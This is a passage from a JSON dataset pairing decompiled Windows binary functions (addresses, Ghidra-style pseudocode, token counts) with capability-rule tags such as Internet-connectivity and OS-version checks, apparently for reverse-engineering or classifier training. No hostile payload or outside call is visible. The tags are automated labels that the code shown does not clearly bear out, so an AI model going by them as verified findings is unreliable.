4) != 0) {\n            fcn.000789b4(*(arg_8h_00 + 4));\n        }\n        if (*(arg_8h_00 + 0xc) != 0) {\n            fcn.000789b4(*(arg_8h_00 + 0x10));\n        }\n        fcn.000357f0(arg_8h_00);\n    }\n    return var_14h;\n}\n",
        "token_count": 1593
    },
    "00065f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00066065)\n// WARNING: Removing unreachable block (ram,0x0006605a)\n// WARNING: Removing unreachable block (ram,0x0006607c)\n// WARNING: Removing unreachable block (ram,0x00065fc1)\n// WARNING: Removing unreachable block (ram,0x00065ff1)\n// WARNING: Removing unreachable block (ram,0x00065ff8)\n// WARNING: Removing unreachable block (ram,0x00066001)\n// WARNING: Removing unreachable block (ram,0x00066014)\n// WARNING: Removing unreachable block (ram,0x0006601d)\n// WARNING: Removing unreachable block (ram,0x0006602d)\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00065f70(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    *(arg_8h + 0x1c) = 1;\n    if (*(arg_8h + 8) != 0) {\n        arg_ch = *(*(arg_8h + 8) + 4);\n        arg_8h_00 = (**0x80051234)(3, arg_ch, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_8h_00 != 0) {\n            iVar1 = *(arg_8h_00 + 0x60);\n            *(iVar1 + -8) = 0;\n            *(iVar1 + -4) = 0;\n            *(iVar1 + -0x21) = 0;\n            iVar1 = *(arg_8h_00 + 0x60);\n            *(iVar1 + -0x24) = 0xf;\n            *(iVar1 + -0x23) = 6;\n            *(iVar1 + -0x10) = arg_ch;\n            *(iVar1 + -0xc) = *(arg_8h + 8);\n            *(iVar1 + -0x20) = 4;\n            *(iVar1 + -0x1c) = 0;\n            *(iVar1 + -0x18) = 0;\n            *(iVar1 + -0x14) = 0;\n            fcn.000785d0(arg_8h_00, arg_ch, &var_ch, 0xffffffff);\n        }\n    }\n    var_4h = *(arg_8h + 4);\n    *(arg_8h + 4) = 0;\n    if (var_4h != 0) {\n        fcn.000789b4(var_4h);\n    }\n    var_4h = *(arg_8h + 0xc);\n    *(arg_8h + 4) = 0;\n    if (var_4h != 0) {\n        fcn.000789b4(var_4h);\n    }\n    if (*(arg_8h + 300) != 0) {\n        *(arg_8h + 300) = 0;\n    }\n    var_4h = *(arg_8h + 0x14);\n    *(arg_8h + 0x14) = 0;\n    if (var_4h != 0) {\n        fcn.000789b4(var_4h);\n        fcn.00034a10(arg_8h + 0x18);\n        fcn.00034a80(arg_8h + 0x18);\n    }\n    return;\n}\n",
        "token_count": 893
    },
    "000661a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000661a0(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 0x124) != 0) {\n        fcn.000349e0(arg_8h + 0x18);\n    }\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 75
    },
    "000661d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000662e1)\n// WARNING: Removing unreachable block (ram,0x000662d6)\n// WARNING: Removing unreachable block (ram,0x000662f7)\n// WARNING: Removing unreachable block (ram,0x0006623e)\n// WARNING: Removing unreachable block (ram,0x0006626e)\n// WARNING: Removing unreachable block (ram,0x00066275)\n// WARNING: Removing unreachable block (ram,0x0006627e)\n// WARNING: Removing unreachable block (ram,0x00066290)\n// WARNING: Removing unreachable block (ram,0x00066299)\n// WARNING: Removing unreachable block (ram,0x000662a9)\n\nuint __cdecl fcn.000661d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = *(arg_8h + 0xe0);\n    var_14h = arg_8h + 0x9e;\n    uVar2 = *(*(arg_8h + 8) + 4);\n    var_10h = (**0x80051234)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n    if (var_10h == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(var_10h + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(var_10h + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 3;\n        *(iVar1 + -0x10) = uVar2;\n        *(iVar1 + -0xc) = *(arg_8h + 8);\n        *(iVar1 + -0x1c) = &var_28h;\n        *(iVar1 + -0x18) = 0;\n        *(iVar1 + -0x14) = 0;\n        var_ch = fcn.000785d0(var_10h, uVar2, &var_8h, 0xffffffff);\n        if (var_ch == -0x3ffffdca) {\n            uVar2 = 0x21590003;\n        }\n        else {\n            *(arg_8h + 300) = 1;\n            if (*(arg_8h + 0x130) != 0) {\n                fcn.000670a0(arg_8h);\n            }\n            uVar2 = fcn.00078a2c(var_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 764
    },
    "000663c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000667f9)\n// WARNING: Removing unreachable block (ram,0x00066513)\n// WARNING: Removing unreachable block (ram,0x0006654f)\n// WARNING: Removing unreachable block (ram,0x00066559)\n// WARNING: Removing unreachable block (ram,0x00066562)\n// WARNING: Removing unreachable block (ram,0x0006657a)\n// WARNING: Removing unreachable block (ram,0x00066583)\n// WARNING: Removing unreachable block (ram,0x00066599)\n// WARNING: Removing unreachable block (ram,0x000665fc)\n// WARNING: Removing unreachable block (ram,0x000665d2)\n// WARNING: Removing unreachable block (ram,0x000665e0)\n// WARNING: Removing unreachable block (ram,0x000667eb)\n// WARNING: Removing unreachable block (ram,0x00066816)\n// WARNING: Removing unreachable block (ram,0x0006672b)\n// WARNING: Removing unreachable block (ram,0x00066767)\n// WARNING: Removing unreachable block (ram,0x00066771)\n// WARNING: Removing unreachable block (ram,0x0006677a)\n// WARNING: Removing unreachable block (ram,0x00066793)\n// WARNING: Removing unreachable block (ram,0x0006679c)\n// WARNING: Removing unreachable block (ram,0x000667b2)\n\nint32_t __cdecl fcn.000663c0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_bch;\n    int16_t *var_b8h;\n    int16_t *var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    if (*(arg_8h + 0x128) == -1) {\n        var_70h = 0x21590065;\n    }\n    else {\n        var_74h = fcn.000356c0(0x140);\n        if (var_74h == 0) {\n            var_70h = 0x21590004;\n        }\n        else {\n            fcn.00034a10(arg_8h + 0x18);\n            fcn.00078bfa(var_74h, 0, 0x140);\n            var_b4h = arg_8h + 0x1e;\n            var_b8h = var_74h + 0x1e;\n            do {\n                iVar1 = *var_b4h;\n                *var_b8h = iVar1;\n                var_b4h = var_b4h + 1;\n                var_b8h = var_b8h + 1;\n            } while (iVar1 != 0);\n            uVar4 = fcn.00078760(var_74h + 0x1e, var_74h + 4, var_74h + 8);\n            var_ch = uVar4;\n            if (uVar4 == 0) {\n                *(arg_8h + 0x14) = *(var_74h + 4);\n                uVar2 = *(*(var_74h + 8) + 4);\n                uVar4 = 0;\n                var_6ch = (**0x80051234)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n                if (var_6ch == 0) {\n                    var_70h = 0x21590004;\n                }\n                else {\n                    iVar3 = *(var_6ch + 0x60);\n                    *(iVar3 + -8) = 0;\n                    *(iVar3 + -4) = 0;\n                    *(iVar3 + -0x21) = 0;\n                    iVar3 = *(var_6ch + 0x60);\n                    *(iVar3 + -0x24) = 0xf;\n                    *(iVar3 + -0x23) = 1;\n                    *(iVar3 + -0x10) = uVar2;\n                    *(iVar3 + -0xc) = *(var_74h + 8);\n                    *(iVar3 + -0x20) = *(arg_8h + 0xc);\n                    uVar4 = fcn.000785d0(var_6ch, uVar2, &fcn.000663c0::var_8h, 0xffffffff);\n                    var_ch = uVar4;\n                    if (uVar4 == 0) {\n                        var_8ch = 0;\n                        var_88h = 0;\n                        var_84h = 0;\n                        var_80h = 0;\n                        var_7ch = 0;\n                        var_78h = 0;\n                        var_24h = 0;\n                        var_20h = 0;\n                        var_1ch = 0;\n                        var_18h = 0;\n                        var_10h = &fcn.000663c0::var_68h;\n                        var_14h = 0x40;\n                        uVar2 = *(*(var_74h + 8) + 4);\n                        var_6ch = (**0x80051234)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n                        if (var_6ch == 0) {\n                            uVar4 = var_ch;\n                            var_70h = fcn.00078a2c();\n                        }\n                        else {\n                            iVar3 = *(var_6ch + 0x60);\n                            *(iVar3 + -8) = 0;\n                            *(iVar3 + -4) = 0;\n                            *(iVar3 + -0x21) = 0;\n                            iVar3 = *(var_6ch + 0x60);\n                            *(iVar3 + -0x24) = 0xf;\n                            *(iVar3 + -0x23) = 4;\n                            *(iVar3 + -0x10) = uVar2;\n                            *(iVar3 + -0xc) = *(var_74h + 8);\n                            *(iVar3 + -0x20) = 0;\n                            *(iVar3 + -0x1c) = &fcn.000663c0::var_8ch;\n                            *(iVar3 + -0x18) = &fcn.000663c0::var_24h;\n                            uVar4 = 0x668b8;\n                            uVar5 = fcn.000785d0(0x668b8, uVar2, &fcn.000663c0::var_8h, 0xffffffff);\n                            var_ch = uVar5;\n                            if (*(arg_8h + 0x14) == 0) {\n                                var_70h = 0x21590006;\n                            }\n                            else if (uVar5 == 0) {\n                                *(var_74h + 0x128) = 0xffffffff;\n                                if (var_14h < 0x41) {\n                                    uVar4 = var_14h;\n                                    fcn.00078be8(var_74h + 0x9e, var_10h, var_14h);\n                                    *(var_74h + 0xe0) = var_14h;\n                                }\n                                *arg_ch = var_74h;\n                                var_70h = 0;\n                            }\n                            else {\n                                var_70h = fcn.00078a2c(uVar5);\n                                uVar4 = uVar5;\n                            }\n                        }\n                    }\n                    else {\n                        var_70h = fcn.00078a2c();\n                    }\n                }\n            }\n            else {\n                var_70h = fcn.00078a2c(uVar4);\n            }\n            if ((var_70h != 0) && (var_74h != 0)) {\n                if (*(var_74h + 4) != 0) {\n                    fcn.000789b4(*(var_74h + 4), uVar4);\n                }\n                fcn.000357f0(var_74h);\n            }\n            *(arg_8h + 0x14) = 0;\n            fcn.00034a80(arg_8h + 0x18);\n        }\n    }\n    return var_70h;\n}\n",
        "token_count": 2035
    },
    "00066a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00066bab)\n// WARNING: Removing unreachable block (ram,0x00066ba0)\n// WARNING: Removing unreachable block (ram,0x00066bc1)\n// WARNING: Removing unreachable block (ram,0x00066b08)\n// WARNING: Removing unreachable block (ram,0x00066b38)\n// WARNING: Removing unreachable block (ram,0x00066b3f)\n// WARNING: Removing unreachable block (ram,0x00066b48)\n// WARNING: Removing unreachable block (ram,0x00066b5a)\n// WARNING: Removing unreachable block (ram,0x00066b63)\n// WARNING: Removing unreachable block (ram,0x00066b73)\n\nuint fcn.00066a20(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_ch;\n    int32_t var_10h;\n    uint var_18h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c38;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffac;\n    if (var_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(*(var_8h + 8) + 4);\n        arg_8h = (**0x80051234)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_8h == 0) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            iVar3 = (**0x8005128c)(var_ch, var_10h, 0, 0, arg_8h);\n            if (iVar3 == 0) {\n                (**0x800512e8)();\n                uVar2 = 0x21590004;\n            }\n            else {\n                var_4h = 0;\n                (**0x80051298)(iVar3, 0, 0);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_8h + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_8h + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 7;\n                *(iVar1 + -0x10) = uVar2;\n                *(iVar1 + -0xc) = *(var_8h + 8);\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_10h;\n                *(arg_8h + 4) = iVar3;\n                uVar2 = fcn.000785d0(arg_8h, uVar2, &var_20h, 0xffffffff);\n                uVar2 = fcn.00078a2c(uVar2);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 897
    },
    "00066c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00066d67)\n// WARNING: Removing unreachable block (ram,0x00066d97)\n// WARNING: Removing unreachable block (ram,0x00066d9e)\n// WARNING: Removing unreachable block (ram,0x00066da7)\n// WARNING: Removing unreachable block (ram,0x00066dba)\n// WARNING: Removing unreachable block (ram,0x00066dc3)\n// WARNING: Removing unreachable block (ram,0x00066dd3)\n// WARNING: Removing unreachable block (ram,0x00066e00)\n// WARNING: Removing unreachable block (ram,0x00066e0b)\n// WARNING: Removing unreachable block (ram,0x00066e22)\n\nuint fcn.00066c60(int32_t param_1, int32_t param_2, int32_t *param_3, uint param_4, uint32_t param_5)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_14h;\n    uint32_t var_18h_2;\n    uint var_18h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c28;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffa8;\n    if (*var_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(*(var_8h + 8) + 4);\n        var_30h = 0;\n        do {\n            if (*var_10h <= var_30h) break;\n            iVar3 = (**0x80051234)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n            if (iVar3 == 0) {\n                uVar2 = 0x21590004;\n                goto code_r0x00066ef3;\n            }\n            iVar4 = (**0x8005128c)(var_ch + var_30h, *var_10h - var_30h, 0, 0, iVar3);\n            if (iVar4 == 0) {\n                (**0x800512e8)();\n                uVar2 = 0x21590004;\n                goto code_r0x00066ef3;\n            }\n            var_4h = 0;\n            (**0x80051298)(iVar4, 0, 2);\n            var_4h = 0xffffffff;\n            iVar1 = *(iVar3 + 0x60);\n            *(iVar1 + -8) = 0;\n            *(iVar1 + -4) = 0;\n            *(iVar1 + -0x21) = 0;\n            iVar1 = *(iVar3 + 0x60);\n            *(iVar1 + -0x24) = 0xf;\n            *(iVar1 + -0x23) = 8;\n            *(iVar1 + -0x10) = uVar2;\n            *(iVar1 + -0xc) = *(var_8h + 8);\n            *(iVar1 + -0x1c) = 0;\n            *(iVar1 + -0x20) = *var_10h - var_30h;\n            *(iVar3 + 4) = iVar4;\n            iVar3 = fcn.000785d0(iVar3, uVar2, &var_20h, var_14h);\n            if (iVar3 != 0) {\n                if (iVar3 == 0x102) {\n                    uVar2 = 0x21590002;\n                }\n                else {\n                    uVar2 = fcn.00078a2c(iVar3);\n                }\n                goto code_r0x00066ef3;\n            }\n            if (var_1ch == 0) {\n                uVar2 = 0x21590003;\n                goto code_r0x00066ef3;\n            }\n            var_30h = var_30h + var_1ch;\n        } while ((var_18h_2 & 1) != 0);\n        *var_10h = var_30h;\n        uVar2 = 0;\n    }\ncode_r0x00066ef3:\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 1147
    },
    "00066f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00066f30(int32_t arg_8h, int32_t arg_ch, char **arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t in_EDX;\n    uint var_48h;\n    char **var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    if ((arg_ch == 4) || (arg_ch == 3)) {\n        uVar2 = fcn.00035980(in_EDX & 0xffff0000 | *(arg_8h + 0xa6));\n        fcn.00078ad4(&var_18h, 0x80055868, *(arg_8h + 0xa8), *(arg_8h + 0xa9), *(arg_8h + 0xaa), *(arg_8h + 0xab), uVar2\n                    );\n        if (arg_ch == 3) {\n            if (arg_14h != 0x4) {\n                return 0x21590064;\n            }\n            var_20h = &var_18h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (cVar1 != '\\0');\n            *arg_10h = var_20h + (1 - (&var_18h + 1));\n        }\n        else {\n            if (arg_14h < 1) {\n                return 0x21590064;\n            }\n            var_30h = &var_18h;\n            do {\n                cVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (cVar1 != '\\0');\n            if (arg_14h < var_30h + (1 - (&var_18h + 1))) {\n                fcn.00078ac8(arg_10h, &var_18h, arg_14h + -1);\n                *(arg_10h + arg_14h + -1) = '\\0';\n            }\n            else {\n                var_40h = &var_18h;\n                var_44h = arg_10h;\n                do {\n                    cVar1 = *var_40h;\n                    *var_44h = cVar1;\n                    var_40h = var_40h + 1;\n                    var_44h = var_44h + 1;\n                } while (cVar1 != '\\0');\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x21590001;\n    }\n    return uVar3;\n}\n",
        "token_count": 658
    },
    "000670f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000670f0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x30);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x30);\n        var_8h = arg_ch;\n        var_4h = 0;\n        iVar1 = fcn.00075eb0(arg_8h_00 + 4, &var_8h, arg_10h, arg_14h, 0, 0, (arg_18h & 1) != 0);\n        if (iVar1 == 0) {\n            *(arg_8h_00 + 0xc) = 1;\n            fcn.000349b0(arg_8h_00 + 0x14);\n            fcn.000349b0(arg_8h_00 + 0x18);\n            fcn.000349b0(arg_8h_00 + 0x1c);\n            *arg_8h = arg_8h_00;\n            iVar1 = 0;\n        }\n        else {\n            fcn.000357f0(arg_8h_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 378
    },
    "000671c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000671c0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x30);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x30);\n        uVar2 = fcn.000356c0(arg_14h);\n        *(arg_8h_00 + 0x20) = uVar2;\n        if (*(arg_8h_00 + 0x20) == 0) {\n            fcn.000357f0(arg_8h_00);\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078be8(*(arg_8h_00 + 0x20), arg_10h, arg_14h);\n            *(arg_8h_00 + 0x24) = arg_14h;\n            *(arg_8h_00 + 0x28) = arg_18h;\n            uVar2 = fcn.00035820(arg_ch);\n            *(arg_8h_00 + 0x2c) = uVar2;\n            if (*(arg_8h_00 + 0x2c) == 0) {\n                fcn.000357f0(*(arg_8h_00 + 0x20));\n                fcn.000357f0(arg_8h_00);\n                iVar1 = 0x21590004;\n            }\n            else {\n                var_8h = arg_ch;\n                var_4h = 0;\n                iVar1 = fcn.00075eb0(arg_8h_00 + 8, &var_8h, 0, 0, arg_10h, arg_14h, -((arg_18h & 1) != 0) & 2);\n                if (iVar1 == 0) {\n                    *(arg_8h_00 + 0xc) = 0;\n                    fcn.000349b0(arg_8h_00 + 0x14);\n                    fcn.000349b0(arg_8h_00 + 0x18);\n                    *arg_8h = arg_8h_00;\n                    iVar1 = 0;\n                }\n                else {\n                    fcn.000357f0(arg_8h_00);\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 637
    },
    "00067340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067340(int32_t arg_8h)\n\n{\n    fcn.000349e0(arg_8h + 0x18);\n    fcn.000349e0(arg_8h + 0x14);\n    if (*(arg_8h + 0xc) != 0) {\n        fcn.000349e0(arg_8h + 0x1c);\n    }\n    fcn.000357f0(*(arg_8h + 0x20));\n    fcn.000357f0(*(arg_8h + 0x2c));\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 149
    },
    "000673a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000673a0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (*(arg_8h + 4) != 0) {\n        var_8h = fcn.000766e0(*(arg_8h + 4), arg_ch, 0);\n    }\n    if (*(arg_8h + 8) != 0) {\n        var_4h = fcn.000766e0(*(arg_8h + 8), arg_ch, 0);\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h;\n    }\n    else {\n        var_ch = var_8h;\n    }\n    return var_ch;\n}\n",
        "token_count": 205
    },
    "00067410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067410(int32_t arg_8h, uint arg_ch)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        fcn.00076620(*(arg_8h + 4), arg_ch, 0);\n    }\n    else {\n        fcn.00076620(*(arg_8h + 8), arg_ch, 0);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00067450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067450(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        if (*(arg_8h + 4) == 0) {\n            fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            fcn.00076480(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    else {\n        fcn.00076480(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "000674c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000674c0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0x21590001;\n    var_4h = 0x21590001;\n    if (*(arg_8h + 4) != 0) {\n        var_8h = fcn.00076b10(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, 0);\n    }\n    if (*(arg_8h + 8) != 0) {\n        var_4h = fcn.00076b10(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, 0);\n    }\n    if (var_8h == 0) {\n        var_ch = var_8h;\n    }\n    else {\n        var_ch = var_4h;\n    }\n    return var_ch;\n}\n",
        "token_count": 245
    },
    "00067540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
